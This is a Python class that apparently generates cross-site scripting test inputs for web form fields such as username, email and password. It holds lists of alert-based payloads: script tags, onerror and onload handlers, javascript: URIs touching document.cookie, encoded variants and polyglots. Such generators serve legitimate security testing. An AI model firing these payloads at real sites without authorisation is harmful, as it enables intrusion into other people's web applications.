from typing import Dict
import random

class XSSGenerator:
    def __init__(self):
        self.basic_attacks = [
            "<script>alert('xss')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "<body onload='alert(1)'>",
            "<video onerror='alert(1)'><source></video>"
        ]
        
        self.dom_based = [
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "javascript:alert(document.location)",
            "<a href='javascript:alert(1)'>click me</a>",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        self.event_handlers = [
            "' onmouseover='alert(1)",
            "' onfocus='alert(1)",
            "' onblur='alert(1)",
            "' onkeyup='alert(1)",
            "' onkeydown='alert(1)"
        ]
        
        self.encoded_attacks = [
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
        ]
        
        self.polyglot_attacks = [
            "javascript:/*-/*`/*\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\x3e",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            "'\"--></style></script><svg/onload=alert(1)//",
            "'\"--></style></script><svg/onload=alert()//>",
            "\"'--></style></script><img src=x onerror=alert(1)>//"
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera um ataque XSS aleatório"""
        all_attacks = (
            self.basic_attacks +
            self.dom_based +
            self.event_handlers +
            self.encoded_attacks +
            self.polyglot_attacks
        )
        
        attack = random.choice(all_attacks)
        return {
            'username': attack,
            'email': f"xss@{attack}.com",
            'password': attack,
            'full_name': attack
        }

    def generate_dom_based(self) -> Dict[str, str]:
        """Gera um ataque XSS baseado em DOM"""
        return {
            'username': random.choice(self.dom_based),
            'password': random.choice(self.dom_based)
        }

    def generate_encoded(self) -> Dict[str, str]:
        """Gera um ataque XSS com codificação"""
        return {
            'username': random.choice(self.encoded_attacks),
            'password': random.choice(self.encoded_attacks)
        }

    def generate_polyglot(self) -> Dict[str, str]:
        """Gera um ataque XSS polimórfico"""
        return {
            'username': random.choice(self.polyglot_attacks),
            'password': random.choice(self.polyglot_attacks)
        }
